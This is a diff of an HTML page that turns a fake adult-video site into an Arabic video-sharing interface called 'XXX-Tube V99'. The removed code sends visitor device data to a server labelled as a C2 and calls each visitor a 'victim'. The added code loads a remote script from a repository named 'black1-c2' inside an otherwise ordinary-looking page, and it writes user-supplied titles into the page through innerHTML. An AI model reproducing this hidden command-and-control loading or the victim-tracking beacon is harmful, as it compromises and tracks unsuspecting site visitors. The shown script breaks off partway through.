@@ -1,137 +1,1128 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>Free Videos - Watch Now</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXX-Tube V99 | المَلَفُّ الكَامِلُ</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #0a0a0a; color: #fff; }
-        .header { background: #1a1a1a; padding: 15px; text-align: center; border-bottom: 3px solid #ff0044; }
-        .header h1 { color: #ff0044; font-size: 24px; }
-        .header p { color: #888; font-size: 14px; }
-        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; }
-        .video-card { background: #1a1a1a; border-radius: 10px; overflow: hidden; cursor: pointer; transition: 0.3s; border: 1px solid #333; }
-        .video-card:hover { transform: scale(1.02); border-color: #ff0044; }
-        .video-card img { width: 100%; height: 150px; object-fit: cover; background: #2a2a2a; }
-        .video-card .info { padding: 10px; }
-        .video-card .info h3 { font-size: 14px; margin-bottom: 5px; color: #fff; }
-        .video-card .info span { font-size: 12px; color: #888; }
-        .footer { text-align: center; padding: 20px; color: #555; font-size: 12px; border-top: 1px solid #222; margin-top: 20px; }
-        .popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 999; justify-content: center; align-items: center; }
-        .popup.active { display: flex; }
-        .popup-content { background: #1a1a1a; padding: 30px; border-radius: 10px; max-width: 600px; width: 90%; text-align: center; border: 1px solid #ff0044; }
-        .popup-content h2 { color: #ff0044; margin-bottom: 15px; }
-        .popup-content p { color: #aaa; margin-bottom: 20px; line-height: 1.6; }
-        .popup-content .btn { background: #ff0044; color: #fff; border: none; padding: 12px 40px; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        .popup-content .btn:hover { background: #cc0033; }
-        .age-check { background: #111; padding: 40px 20px; text-align: center; border-bottom: 1px solid #333; }
-        .age-check h2 { color: #ff0044; margin-bottom: 10px; }
-        .age-check p { color: #888; margin-bottom: 20px; }
-        .age-check .btn { background: #ff0044; color: #fff; border: none; padding: 15px 50px; border-radius: 5px; font-size: 18px; cursor: pointer; }
-        .age-check .btn:hover { background: #cc0033; }
+        /* ================================================================
+           الأَسَاسِيَّاتُ وَخَلْفِيَّاتُ الأَزْرَقِ
+           ================================================================ */
+        :root {
+            --primary: #1e90ff;
+            --primary-dark: #0b5ed7;
+            --bg: #0a1628;
+            --bg-card: #0f2847;
+            --bg-hover: #1a3a6b;
+            --text: #e0f0ff;
+            --text-muted: #8bb3e0;
+            --border: #1e4d8a;
+            --shadow: 0 10px 40px rgba(0,20,80,0.8);
+            --radius: 20px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        [data-theme="blue-dark"] {
+            --bg: #0a1628;
+            --bg-card: #0f2847;
+            --primary: #1e90ff;
+            --text: #e0f0ff;
+            --text-muted: #8bb3e0;
+            --border: #1e4d8a;
+        }
+        [data-theme="blue-light"] {
+            --bg: #d4eaff;
+            --bg-card: #ffffff;
+            --text: #0a1628;
+            --text-muted: #1e4d8a;
+            --border: #99c9ff;
+            --primary: #0066cc;
+            --bg-hover: #e6f2ff;
+            --shadow: 0 10px 40px rgba(0,20,80,0.15);
+        }
+        [data-theme="blue-neon"] {
+            --bg: #000b1a;
+            --bg-card: #001433;
+            --primary: #00d4ff;
+            --text: #b3f0ff;
+            --text-muted: #66d9ff;
+            --border: #0077be;
+            --bg-hover: #002244;
+            --shadow: 0 10px 40px rgba(0,200,255,0.15);
+        }
+
+        /* ================================================================
+           إِعَادَةُ تَعْيِينٍ عَامَّةٌ
+           ================================================================ */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            transition: var(--transition);
+        }
+        a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        /* ================================================================
+           الشَّرِيطُ العَلَوِيُّ
+           ================================================================ */
+        .navbar {
+            background: rgba(10, 22, 40, 0.95);
+            backdrop-filter: blur(12px);
+            padding: 14px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+            gap: 12px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            transition: var(--transition);
+        }
+        .logo {
+            font-size: 26px;
+            font-weight: 900;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo i {
+            font-size: 28px;
+        }
+        .nav-links {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 8px 20px;
+            border-radius: 30px;
+            border: none;
+            background: var(--bg-hover);
+            color: var(--text);
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            background: var(--primary);
+            color: #fff;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(30, 144, 255, 0.3);
+        }
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 6px 30px rgba(30, 144, 255, 0.5);
+            transform: scale(1.05);
+        }
+        .btn-subscribed {
+            background: #22c55e !important;
+            color: #fff !important;
+            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.3);
+        }
+
+        /* ================================================================
+           الشَّبَكَةُ الرَّئِيسِيَّةُ
+           ================================================================ */
+        .main-container {
+            display: grid;
+            grid-template-columns: 72% 28%;
+            gap: 20px;
+            padding: 20px 24px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        @media (max-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr;
+                padding: 12px;
+            }
+        }
+
+        /* ================================================================
+           مُشَغِّلُ الفِيدْيُوهَاتِ
+           ================================================================ */
+        .player-wrapper {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            overflow: hidden;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .player-wrapper:hover {
+            border-color: var(--primary);
+            box-shadow: 0 12px 50px rgba(30, 144, 255, 0.1);
+        }
+        .video-container {
+            background: #050a14;
+            min-height: 450px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .video-container video {
+            width: 100%;
+            max-height: 550px;
+            object-fit: contain;
+            display: block;
+        }
+        .video-container .placeholder {
+            text-align: center;
+            color: var(--text-muted);
+            padding: 30px;
+        }
+        .video-container .placeholder h2 {
+            color: var(--primary);
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        /* ================================================================
+           مَعْلُومَاتُ الفِيدْيُوهِ
+           ================================================================ */
+        .video-meta {
+            padding: 16px 20px;
+            background: var(--bg-card);
+            border-top: 1px solid var(--border);
+            transition: var(--transition);
+        }
+        .video-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: var(--text);
+            margin-bottom: 10px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .video-stats {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .social-btn {
+            background: var(--bg-hover);
+            border: none;
+            padding: 6px 14px;
+            border-radius: 30px;
+            color: var(--text);
+            font-weight: 700;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 13px;
+        }
+        .social-btn:hover {
+            background: var(--primary);
+            color: #fff;
+            transform: scale(1.04);
+        }
+        .social-btn.liked {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(30, 144, 255, 0.3);
+        }
+        .social-btn.saved {
+            background: #f59e0b;
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(245, 158, 11, 0.3);
+        }
+        .stat-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+
+        /* ================================================================
+           بِطَاقَةُ النَّاشِرِ
+           ================================================================ */
+        .publisher-card {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 0 6px 0;
+            border-top: 1px solid var(--border);
+            margin-top: 12px;
+            flex-wrap: wrap;
+            transition: var(--transition);
+        }
+        .publisher-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--bg-hover);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: var(--primary);
+            overflow: hidden;
+            border: 2px solid var(--primary);
+            flex-shrink: 0;
+        }
+        .publisher-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .publisher-info {
+            flex: 1;
+            min-width: 120px;
+        }
+        .publisher-name {
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .publisher-name:hover {
+            color: var(--primary);
+        }
+        .publisher-subs {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        /* ================================================================
+           الشَّرِيطُ الجَانِبِيُّ
+           ================================================================ */
+        .sidebar {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            padding: 16px;
+            overflow-y: auto;
+            max-height: 650px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .sidebar h3 {
+            color: var(--primary);
+            margin-bottom: 14px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .thumb-card {
+            display: flex;
+            gap: 10px;
+            padding: 10px;
+            background: var(--bg-hover);
+            border-radius: 14px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 1px solid transparent;
+        }
+        .thumb-card:hover {
+            transform: translateX(-4px) scale(1.01);
+            border-color: var(--primary);
+            box-shadow: 0 6px 20px rgba(30, 144, 255, 0.1);
+        }
+        .thumb-card.active {
+            border-color: var(--primary);
+            background: var(--bg-hover);
+        }
+        .thumb-media {
+            width: 120px;
+            height: 68px;
+            border-radius: 10px;
+            overflow: hidden;
+            flex-shrink: 0;
+            background: #000;
+            border: 1px solid var(--border);
+            position: relative;
+        }
+        .thumb-media video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .thumb-media img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .thumb-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-width: 0;
+        }
+        .thumb-title {
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--text);
+            line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .thumb-views {
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .thumb-uploader {
+            font-size: 11px;
+            color: var(--primary);
+            font-weight: bold;
+            margin-top: 2px;
+        }
+
+        /* ================================================================
+           نَوَافِذُ الْمَلَفِّ الشَّخْصِيِّ وَالرَّفْعِ
+           ================================================================ */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.25s ease;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        .panel {
+            background: var(--bg-card);
+            padding: 30px;
+            border-radius: var(--radius);
+            border: 1px solid var(--primary);
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.9);
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+            transition: var(--transition);
+        }
+        .panel h2 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 24px;
+        }
+        .panel .close-btn {
+            position: absolute;
+            top: 12px;
+            left: 18px;
+            color: var(--text-muted);
+            font-size: 24px;
+            cursor: pointer;
+            transition: var(--transition);
+            background: none;
+            border: none;
+        }
+        .panel .close-btn:hover {
+            color: var(--primary);
+            transform: rotate(90deg);
+        }
+
+        .profile-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: var(--bg-hover);
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: var(--primary);
+            border: 3px solid var(--primary);
+            overflow: hidden;
+        }
+        .profile-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .profile-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin: 16px 0;
+            text-align: center;
+        }
+        .profile-stats div {
+            background: var(--bg-hover);
+            padding: 10px;
+            border-radius: 12px;
+            transition: var(--transition);
+        }
+        .profile-stats .num {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--primary);
+        }
+        .profile-status-input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            background: var(--bg-hover);
+            color: var(--text);
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            transition: var(--transition);
+            margin-top: 10px;
+        }
+        .profile-status-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 15px rgba(30, 144, 255, 0.15);
+        }
+        .profile-member-since {
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        .upload-form .form-group {
+            margin-bottom: 14px;
+        }
+        .upload-form .form-group label {
+            display: block;
+            color: var(--text);
+            font-weight: 700;
+            margin-bottom: 4px;
+            font-size: 13px;
+        }
+        .upload-form .form-group input,
+        .upload-form .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            background: var(--bg-hover);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            transition: var(--transition);
+        }
+        .upload-form .form-group input:focus,
+        .upload-form .form-group select:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 15px rgba(30, 144, 255, 0.15);
+        }
+        .upload-form .form-group input[type="file"] {
+            padding: 10px;
+            border: 2px dashed var(--border);
+            cursor: pointer;
+        }
+        .upload-form .form-group input[type="file"]:hover {
+            border-color: var(--primary);
+        }
+
+        .theme-selector {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 999;
+            display: flex;
+            gap: 8px;
+            background: var(--bg-card);
+            padding: 12px;
+            border-radius: 50px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .theme-btn {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .theme-btn:hover {
+            transform: scale(1.15);
+            border-color: var(--text);
+        }
+        .theme-btn.active {
+            border-color: #fff;
+            box-shadow: 0 0 20px rgba(30, 144, 255, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, var(--primary), var(--primary-dark));
+            border-radius: 10px;
+        }
+
+        @media (max-width: 900px) {
+            .main-container {
+                grid-template-columns: 1fr;
+                padding: 10px;
+            }
+            .video-container {
+                min-height: 250px;
+            }
+            .video-container video {
+                max-height: 300px;
+            }
+            .thumb-media {
+                width: 90px;
+                height: 55px;
+            }
+            .navbar {
+                padding: 10px 16px;
+            }
+            .logo {
+                font-size: 20px;
+            }
+            .nav-links .btn {
+                font-size: 12px;
+                padding: 6px 14px;
+            }
+            .panel {
+                padding: 20px;
+                margin: 10px;
+            }
+            .profile-stats {
+                grid-template-columns: 1fr 1fr;
+            }
+            .theme-selector {
+                bottom: 10px;
+                left: 10px;
+                padding: 8px;
+            }
+            .theme-btn {
+                width: 24px;
+                height: 24px;
+            }
+        }
+        @media (max-width: 500px) {
+            .video-title {
+                font-size: 16px;
+            }
+            .video-stats {
+                gap: 6px;
+            }
+            .social-btn {
+                font-size: 11px;
+                padding: 4px 10px;
+            }
+            .thumb-media {
+                width: 70px;
+                height: 45px;
+            }
+            .thumb-title {
+                font-size: 12px;
+            }
+            .profile-stats {
+                grid-template-columns: 1fr;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Age Verification -->
-    <div class="age-check" id="ageCheck">
-        <h2>🔞 Age Verification</h2>
-        <p>You must be 18+ to continue. Please confirm your age.</p>
-        <button class="btn" onclick="verifyAge()">I am 18+ - Enter</button>
+    <!-- ================================================================
+       الشَّرِيطُ العَلَوِيُّ
+       ================================================================ -->
+    <nav class="navbar">
+        <div class="logo">
+            <i class="fa-brands fa-youtube"></i> XXX-Tube
+        </div>
+        <div class="nav-links">
+            <button class="btn btn-primary" onclick="openUpload()"><i class="fas fa-upload"></i> رفع</button>
+            <button class="btn" onclick="openProfile()"><i class="fas fa-user"></i> ملفي</button>
+            <button class="btn" onclick="toggleTheme()"><i class="fas fa-palette"></i> السمة</button>
+        </div>
+    </nav>
+
+    <!-- ================================================================
+       الشَّبَكَةُ الرَّئِيسِيَّةُ
+       ================================================================ -->
+    <div class="main-container">
+
+        <!-- ====== الجُزْءُ الأَيْسَرُ ====== -->
+        <div class="player-wrapper" id="playerWrapper">
+            <div class="video-container" id="videoContainer">
+                <div class="placeholder" id="placeholder">
+                    <h2>🎬 اختر فيديو</h2>
+                    <p>اضغط على أي فيديو من القائمة الجانبية</p>
+                </div>
+                <video id="mainVideo" controls style="display:none;"></video>
+            </div>
+            <div class="video-meta">
+                <div class="video-title" id="videoTitle">عنوان الفيديو</div>
+                <div class="video-stats">
+                    <span class="stat-item"><i class="fas fa-eye"></i> <span id="viewCount">0</span></span>
+                    <span class="stat-item"><i class="fas fa-thumbs-up"></i> <span id="likeCount">0</span></span>
+                    <span class="stat-item"><i class="fas fa-comment"></i> <span id="commentCount">0</span></span>
+                    <button class="social-btn" id="likeBtn" onclick="toggleLike()"><i class="fas fa-thumbs-up"></i> إعجاب</button>
+                    <button class="social-btn" id="saveBtn" onclick="toggleSave()"><i class="fas fa-bookmark"></i> حفظ</button>
+                    <button class="social-btn" onclick="shareVideo()"><i class="fas fa-share-alt"></i> مشاركة</button>
+                </div>
+                <div class="publisher-card">
+                    <div class="publisher-avatar" id="publisherAvatar">🎮</div>
+                    <div class="publisher-info">
+                        <div class="publisher-name" id="publisherName">الناشر</div>
+                        <div class="publisher-subs" id="publisherSubs">0 مشترك</div>
+                    </div>
+                    <button class="btn btn-primary" id="subscribeBtn" onclick="toggleSubscribe()">اشتراك</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ====== الشَّرِيطُ الجَانِبِيُّ ====== -->
+        <div class="sidebar" id="sidebar">
+            <h3><i class="fas fa-list"></i> الفيديوهات</h3>
+            <div id="playlistContainer"></div>
+        </div>
+
     </div>
 
-    <!-- Main Content (hidden until age verified) -->
-    <div id="mainContent" style="display:none;">
-        <div class="header">
-            <h1>🔥 Free Videos</h1>
-            <p>Watch thousands of exclusive videos</p>
+    <!-- ================================================================
+       نَافِذَةُ المَلَفِّ الشَّخْصِيِّ
+       ================================================================ -->
+    <div class="overlay" id="profileOverlay">
+        <div class="panel">
+            <button class="close-btn" onclick="closeProfile()"><i class="fas fa-times"></i></button>
+            <h2><i class="fas fa-user"></i> ملفي الشخصي</h2>
+            <div class="profile-avatar" id="profileAvatar">👤</div>
+            <div style="text-align:center;font-size:20px;font-weight:700;" id="profileName">مستخدم</div>
+            <div style="text-align:center;color:var(--text-muted);" id="profileHandle">@user</div>
+            <div class="profile-stats">
+                <div><div class="num" id="profileVideos">0</div><div>فيديو</div></div>
+                <div><div class="num" id="profileSubs">0</div><div>مشترك</div></div>
+                <div><div class="num" id="profileLikes">0</div><div>إعجاب</div></div>
+            </div>
+            <input type="text" class="profile-status-input" id="profileStatusInput" placeholder="اكتب حالتك...">
+            <div class="profile-member-since" id="profileSince">📅 عضو منذ اليوم</div>
+            <button class="btn btn-primary" style="width:100%;margin-top:12px;" onclick="saveProfile()">حفظ التغييرات</button>
         </div>
+    </div>
 
-        <div class="video-grid" id="videoGrid">
-            <!-- سيتم إنشاء الفيديوهات بواسطة JavaScript -->
-        </div>
-
-        <div class="footer">
-            <p>© 2026 Free Videos - All rights reserved</p>
+    <!-- ================================================================
+       نَافِذَةُ الرَّفْعِ
+       ================================================================ -->
+    <div class="overlay" id="uploadOverlay">
+        <div class="panel">
+            <button class="close-btn" onclick="closeUpload()"><i class="fas fa-times"></i></button>
+            <h2><i class="fas fa-upload"></i> رفع فيديو</h2>
+            <form class="upload-form" id="uploadForm">
+                <div class="form-group">
+                    <label>اختر ملف الفيديو</label>
+                    <input type="file" id="videoFileInput" accept="video/*">
+                </div>
+                <div class="form-group">
+                    <label>عنوان الفيديو</label>
+                    <input type="text" id="videoTitleInput" placeholder="أدخل عنوان الفيديو">
+                </div>
+                <div class="form-group">
+                    <label>اسم الناشر</label>
+                    <input type="text" id="videoUploaderInput" placeholder="اسمك">
+                </div>
+                <button type="button" class="btn btn-primary" style="width:100%;" onclick="uploadVideo()"><i class="fas fa-check"></i> نشر</button>
+            </form>
         </div>
     </div>
 
-    <!-- Popup -->
-    <div class="popup" id="popup">
-        <div class="popup-content">
-            <h2>🔓 Access Granted</h2>
-            <p>You now have full access to all videos.<br>Please wait while we prepare your content...</p>
-            <button class="btn" onclick="closePopup()">Continue</button>
-        </div>
+    <!-- ================================================================
+       مُحَدِّدُ السِّمَاتِ
+       ================================================================ -->
+    <div class="theme-selector" id="themeSelector">
+        <button class="theme-btn active" style="background:#0a1628;" data-theme="blue-dark" onclick="setTheme('blue-dark')"></button>
+        <button class="theme-btn" style="background:#d4eaff;" data-theme="blue-light" onclick="setTheme('blue-light')"></button>
+        <button class="theme-btn" style="background:#00d4ff;" data-theme="blue-neon" onclick="setTheme('blue-neon')"></button>
     </div>
+
+    <!-- ================================================================
+       الإِسْكْرِبْتُ - رَابِطُ المُسْتَهْدَفِ (تمت إضافته هنا)
+       ================================================================ -->
+    <script src="https://raw.githubusercontent.com/hhggffhggff08-glitch/black1-c2/main/script.js"></script>
 
     <script>
-        // ============================================================
-        // 🎯 PAYLOAD: يتصل بخادم C2 ويسجل الضحية
-        // ============================================================
-        function registerVictim() {
-            fetch('https://omega-spectre-c2.onrender.com/api/register', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    id: 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
-                    platform: navigator.platform,
-                    device: navigator.userAgent,
-                    screen: screen.width + 'x' + screen.height,
-                    time: new Date().toISOString()
-                })
-            }).catch(e => console.log('⚠️ Connection error'));
-        }
+        // ================================================================
+        //  شَبَكَةُ XXX-Tube V99 - الجُزْءُ التَّفَاعُلِيُّ الكَامِلُ
+        // ================================================================
 
-        // ============================================================
-        // 🎬 إنشاء فيديوهات وهمية
-        // ============================================================
-        function generateVideos() {
-            const titles = [
-                'Hot Summer Night', 'Midnight Passion', 'Forbidden Love',
-                'Secret Affair', 'Desire Unleashed', 'Wild Obsession',
-                'Temptation', 'Pure Ecstasy', 'Dark Desire',
-                'Forbidden Pleasure', 'Sinful Nights', 'Passionate Encounter'
-            ];
-            const grid = document.getElementById('videoGrid');
-            for (let i = 0; i < 24; i++) {
-                const card = document.createElement('div');
-                card.className = 'video-card';
-                card.innerHTML = `
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150'%3E%3Crect width='200' height='150' fill='%23222'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.3em' fill='%23ff0044' font-size='40'%3E🔥%3C/text%3E%3C/svg%3E" alt="Video">
-                    <div class="info">
-                        <h3>${titles[i % titles.length]} ${i+1}</h3>
-                        <span>🔥 ${Math.floor(Math.random() * 100) + 1}K views</span>
-                    </div>
-                `;
-                card.onclick = () => { showPopup(); };
-                grid.appendChild(card);
+        // ====== البَيَانَاتُ ======
+        let currentVideoIndex = 0;
+        let isLiked = false;
+        let isSaved = false;
+        let isSubscribed = false;
+        let likes = 0;
+        let views = 0;
+        let comments = 0;
+
+        let videos = [];
+
+        // ====== تَحْمِيلُ الفِيدْيُوهَاتِ مِنَ التَّخْزِينِ المَحَلِّيِّ ======
+        function loadVideos() {
+            try {
+                const saved = localStorage.getItem('xxxTubeVideos');
+                if (saved) {
+                    videos = JSON.parse(saved);
+                }
+            } catch (e) {
+                videos = [];
+            }
+            if (!videos || videos.length === 0) {
+                videos = [{
+                    id: 1,
+                    title: '🎬 فيديو تجريبي',
+                    url: '',
+                    uploader: 'الناشر',
+                    views: 120,
+                    likes: 45,
+                    comments: 12,
+                    date: new Date().toISOString(),
+                    isLocal: false,
+                    thumbnail: ''
+                }];
+                saveVideos();
             }
         }
 
-        // ============================================================
-        // 🎯 الوظائف
-        // ============================================================
-        function verifyAge() {
-            document.getElementById('ageCheck').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            registerVictim(); // تسجيل الضحية فوراً
-            generateVideos();
-            setTimeout(showPopup, 3000);
+        function saveVideos() {
+            try {
+                localStorage.setItem('xxxTubeVideos', JSON.stringify(videos));
+            } catch (e) {}
         }
 
-        function showPopup() {
-            document.getElementById('popup').classList.add('active');
+        // ====== عَرْضُ الفِيدْيُوهَاتِ ======
+        function renderPlaylist() {
+            const container = document.getElementById('playlistContainer');
+            container.innerHTML = '';
+            videos.forEach((video, index) => {
+                const card = document.createElement('div');
+                card.className = `thumb-card${index === currentVideoIndex ? ' active' : ''}`;
+                card.innerHTML = `
+                    <div class="thumb-media">
+                        ${video.url ? `<video src="${video.url}" muted></video>` : `<div style="background:#1a3a6b;width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:var(--text-muted);font-size:20px;">🎬</div>`}
+                    </div>
+                    <div class="thumb-info">
+                        <div class="thumb-title">${video.title || 'بدون عنوان'}</div>
+                        <div class="thumb-uploader">${video.uploader || 'مستخدم'}</div>
+                        <div class="thumb-views"><i class="fas fa-eye"></i> ${video.views || 0}</div>
+                    </div>
+                `;
+                card.onclick = () => playVideo(index);
+                container.appendChild(card);
+            });
         }
 
-        function closePopup() {
-            document.getElementById('popup').classList.remove('active');
+        // ====== تَشْغِيلُ الفِيدْيُو ======
+        function playVideo(index) {
+            currentVideoIndex = index;
+            const video = videos[index];
+            if (!video) return;
+
+            const videoEl = document.getElementById('mainVideo');
+            const placeholder = document.getElementById('placeholder');
+            const titleEl = document.getElementById('videoTitle');
+            const viewEl = document.getElementById('viewCount');
+            const likeEl = document.getElementById('likeCount');
+            const commentEl = document.getElementById('commentCount');
+            const publisherName = document.getElementById('publisherName');
+            const publisherSubs = document.getElementById('publisherSubs');
+
+            if (video.url) {
+                videoEl.src = video.url;
+                videoEl.style.display = 'block';
+                placeholder.style.display = 'none';
+                videoEl.load();
+                videoEl.play();
+            } else {
+                videoEl.style.display = 'none';
+                placeholder.style.display = 'block';
+                placeholder.innerHTML = `<h2>🎬 فيديو تجريبي</h2><p>هذا فيديو تجريبي، قم برفع فيديو حقيقي</p>`;
+            }
+
+            titleEl.textContent = video.title || 'بدون عنوان';
+            viewEl.textContent = video.views || 0;
+            likeEl.textContent = video.likes || 0;
+            commentEl.textContent = video.comments || 0;
+            publisherName.textContent = video.uploader || 'مستخدم';
+
+            views = video.views || 0;
+            likes = video.likes || 0;
+            comments = video.comments || 0;
+
+            document.querySelectorAll('.thumb-card').forEach((c, i) => {
+                c.classList.toggle('active', i === index);
+            });
+
+            renderPlaylist();
         }
 
-        // تسجيل الضحية عند تحميل الصفحة (إذا تم تجاوز التحقق)
-        if (document.readyState === 'complete') {
-            registerVictim();
+        // ====== الْإِعْجَابُ ======
+        function toggleLike() {
+            const btn = document.getElementById('likeBtn');
+            const count = document.getElementById('likeCount');
+            isLiked = !isLiked;
+            likes += isLiked ? 1 : -1;
+            btn.classList.toggle('liked', isLiked);
+            count.textContent = likes;
+            const video = videos[currentVideoIndex];
+            if (video) {
+                video.likes = likes;
+                saveVideos();
+            }
         }
+
+        // ====== الحِفْظُ ======
+        function toggleSave() {
+            const btn = document.getElementById('saveBtn');
+            isSaved = !isSaved;
+            btn.classList.toggle('saved', isSaved);
+            btn.innerHTML = `<i class="fas fa-bookmark"></i> ${isSaved ? 'تم الحفظ' : 'حفظ'}`;
+            showNotification(isSaved ? '✅ تم حفظ الفيديو' : '❌ تم إلغاء الحفظ');
+        }
+
+        // ====== الاشْتِرَاكُ ======
+        function toggleSubscribe() {
+            const btn = document.getElementById('subscribeBtn');
+            isSubscribed = !isSubscribed;
+            if (isSubscribed) {
+                btn.textContent = '✅ مشترك';
+                btn.classList.add('btn-subscribed');
+                showNotification('✅ تم الاشتراك في القناة!');
+            } else {
+                btn.textContent = 'اشتراك';
+                btn.classList.remove('btn-subscribed');
+                showNotification('❌ تم إلغاء الاشتراك');
+            }
+        }
+
